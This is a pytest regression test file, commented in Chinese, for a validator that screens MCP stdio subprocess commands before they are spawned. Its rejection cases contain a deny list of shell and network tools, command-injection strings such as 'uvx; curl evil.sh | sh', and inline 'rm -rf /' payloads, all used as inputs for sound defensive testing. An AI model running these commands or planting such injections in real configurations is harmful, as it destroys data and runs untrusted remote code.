# -*- coding: utf-8 -*-
"""MCP stdio 子进程安全校验回归测试

背景（本次新增）：
DriFox 的 MCP stdio 连接此前对 command 不做任何校验，直接 spawn 子进程。
若配置里的 command 被篡改为 shell / 危险命令（如 cmd、powershell、curl | sh），
会在本机拉起不可信进程。现移植 AstrBot 的 validate_mcp_stdio_config 设计，
在 spawn 前按「白名单 + 黑名单 + shell 元字符 + inline 代码标志」四层拦截。

本测试锁定 _validate_stdio_config 返回空串=通过、非空串=拒绝原因。
"""

import pytest

from app.tools.mcp_tools import (
    _normalize_stdio_command_name,
    _validate_stdio_config,
)


# ═══════════════════════════════════════════════════════════
# _normalize_stdio_command_name 归一化
# ═══════════════════════════════════════════════════════════


class TestNormalizeCommandName:
    def test_plain_name(self):
        assert _normalize_stdio_command_name("python") == "python"

    def test_windows_absolute_path(self):
        assert _normalize_stdio_command_name("C:\\Python312\\python.exe") == "python"

    def test_unix_path(self):
        assert _normalize_stdio_command_name("/usr/local/bin/node") == "node"

    def test_cmd_bat_extension(self):
        assert _normalize_stdio_command_name("npx.cmd") == "npx"
        assert _normalize_stdio_command_name("uvx.bat") == "uvx"

    def test_upper_case(self):
        assert _normalize_stdio_command_name("Python.exe") == "python"

    def test_relative_path(self):
        assert _normalize_stdio_command_name(".\\venv\\Scripts\\python") == "python"


# ═══════════════════════════════════════════════════════════
# 放行场景
# ═══════════════════════════════════════════════════════════


class TestAllowedConfigs:
    def test_uvx_minimax(self):
        """真实的 MiniMax MCP 配置（uvx 启动）"""
        cfg = {
            "command": "uvx",
            "args": ["--with", "mcp<2", "minimax-coding-plan-mcp", "-y"],
            "type": "stdio",
        }
        assert _validate_stdio_config(cfg) == ""

    def test_npx_server(self):
        cfg = {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem"]}
        assert _validate_stdio_config(cfg) == ""

    def test_python_module_launch(self):
        """python -m 模块启动合法（只禁 -c）"""
        cfg = {"command": "python", "args": ["-m", "mcp_server"]}
        assert _validate_stdio_config(cfg) == ""

    def test_py_absolute_path(self):
        cfg = {"command": "C:\\Python312\\python.exe", "args": ["server.py"]}
        assert _validate_stdio_config(cfg) == ""

    def test_empty_command_passthrough(self):
        """无 command 字段 → url 型（sse/http），放行"""
        assert _validate_stdio_config({"url": "https://example.com/mcp"}) == ""
        assert _validate_stdio_config({"type": "sse", "url": "http://x/sse"}) == ""


# ═══════════════════════════════════════════════════════════
# 拒绝场景
# ═══════════════════════════════════════════════════════════


class TestRejectedConfigs:
    @pytest.mark.parametrize(
        "command",
        [
            "bash",
            "sh",
            "powershell",
            "powershell.exe",
            "cmd",
            "curl",
            "wget",
            "ssh",
            "rm",
            "sudo",
            "kill",
            "docker",
            "C:\\Windows\\System32\\cmd.exe",
        ],
    )
    def test_denied_command_rejected(self, command):
        assert _validate_stdio_config({"command": command}) != ""

    @pytest.mark.parametrize(
        "command",
        ["not-a-real-lang", "ruby", "go", "java", "tar", "echo"],
    )
    def test_not_in_allowlist_rejected(self, command):
        assert _validate_stdio_config({"command": command}) != ""

    @pytest.mark.parametrize(
        "command",
        [
            "uvx; curl evil.sh | sh",
            "python && whoami",
            "npx > /tmp/pwn",
            "python `id`",
            "uvx $ENV",
        ],
    )
    def test_shell_meta_rejected(self, command):
        assert _validate_stdio_config({"command": command}) != ""

    def test_python_inline_code_rejected(self):
        cfg = {"command": "python", "args": ["-c", "import os; os.system('rm -rf /')"]}
        assert _validate_stdio_config(cfg) != ""

    def test_python_inline_code_short_flag_rejected(self):
        cfg = {"command": "py", "args": ["-3", "-c", "print(1)"]}
        assert _validate_stdio_config(cfg) != ""

    @pytest.mark.parametrize("flag", ["-e", "--eval", "-p", "--print"])
    def test_node_inline_eval_rejected(self, flag):
        cfg = {"command": "node", "args": [flag, "console.log('x')"]}
        assert _validate_stdio_config(cfg) != ""

    def test_args_with_control_chars_rejected(self):
        cfg = {"command": "python", "args": ["server.py\nrm -rf /"]}
        assert _validate_stdio_config(cfg) != ""

    def test_args_not_list_rejected(self):
        cfg = {"command": "python", "args": "-c print(1)"}
        assert _validate_stdio_config(cfg) != ""

    def test_command_not_str_rejected(self):
        cfg = {"command": 42}
        assert _validate_stdio_config(cfg) != ""
